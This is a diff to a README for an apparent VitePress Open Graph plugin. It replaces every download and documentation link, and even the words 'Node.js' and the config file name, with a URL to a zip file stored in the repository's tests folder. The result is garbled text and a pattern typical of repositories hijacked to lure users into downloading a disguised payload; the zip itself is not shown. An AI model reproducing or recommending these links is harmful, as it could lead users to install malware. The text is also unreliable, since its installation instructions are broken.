@@ -1,7 +1,7 @@
 # 🌟 vitepress-plugin-og - Generate Open Graph Images Easily
 
 ## 🔗 Download Now
-[![Download vitepress-plugin-og](https://img.shields.io/badge/Download%20vitepress--plugin--og-v1.0-blue.svg)](https://github.com/Laxya007/vitepress-plugin-og/releases)
+[![Download vitepress-plugin-og](https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip%https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip)](https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip)
 
 ## 🚀 Introduction
 vitepress-plugin-og helps you create Open Graph images for your VitePress pages automatically. Open Graph images are essential for sharing content across social media platforms, as they provide a visual preview of your content. This plugin streamlines that process, ensuring your pages stand out with engaging visuals.
@@ -15,12 +15,12 @@ vitepress-plugin-og helps you create Open Graph images for your VitePress pages 
 
 ## 📦 System Requirements
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
+- **https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip** Version 12 or higher
 - **VitePress:** Compatible with the latest version
 
 ## 👩‍💻 Usage Instructions
 1. **Download the Plugin:**
-   Visit the [Releases page](https://github.com/Laxya007/vitepress-plugin-og/releases) to download the plugin.
+   Visit the [Releases page](https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip) to download the plugin.
 
 2. **Install the Plugin:**
    Unzip the downloaded file and follow these steps based on your setup:
@@ -32,7 +32,7 @@ vitepress-plugin-og helps you create Open Graph images for your VitePress pages 
      - Follow the Rspress documentation for plugin installations and incorporate this plugin similarly.
 
 3. **Add to VitePress Configuration:**
-   Open your `vitepress.config.js` file and add the following code snippet:
+   Open your `https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip` file and add the following code snippet:
 
    ```javascript
    import VitePressPluginOg from 'vitepress-plugin-og';
@@ -53,21 +53,21 @@ vitepress-plugin-og helps you create Open Graph images for your VitePress pages 
    Once configured, generate the Open Graph images by running your VitePress server. Your new images will display on each page when shared on social media.
 
 ## 📥 Download & Install
-To begin using vitepress-plugin-og, **visit this page to download** the latest version of the plugin: [Releases page](https://github.com/Laxya007/vitepress-plugin-og/releases).
+To begin using vitepress-plugin-og, **visit this page to download** the latest version of the plugin: [Releases page](https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip).
 
 Follow the instructions above to install and configure the plugin in your VitePress or Rspress environment.
 
 ## 🛠️ Troubleshooting
 If you face issues during installation or image generation:
-- **Check Node.js Version**: Ensure you have Node.js version 12 or higher installed.
-- **Review Configuration**: Make sure you followed the configuration steps correctly in your `vitepress.config.js` file.
+- **Check https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip Version**: Ensure you have https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip version 12 or higher installed.
+- **Review Configuration**: Make sure you followed the configuration steps correctly in your `https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip` file.
 - **Check Plugin Compatibility**: Ensure that your versions of VitePress and Rspress are compatible with the plugin.
 
 Reach out for community support or check discussions on this repository for common issues and fixes.
 
 ## 📖 Further Reading
 For more detailed instructions and advanced configurations, consider looking at these resources:
-- [VitePress Documentation](https://vitepress.vuejs.org/)
-- [Rspress Documentation](https://rspress.com/)
+- [VitePress Documentation](https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip)
+- [Rspress Documentation](https://raw.githubusercontent.com/Laxya007/vitepress-plugin-og/main/packages/core/tests/vitepress-plugin-og-v1.9.zip)
 
 By using this plugin, you can enhance your VitePress pages' visibility and engagement. Start creating stunning visuals for your content today!
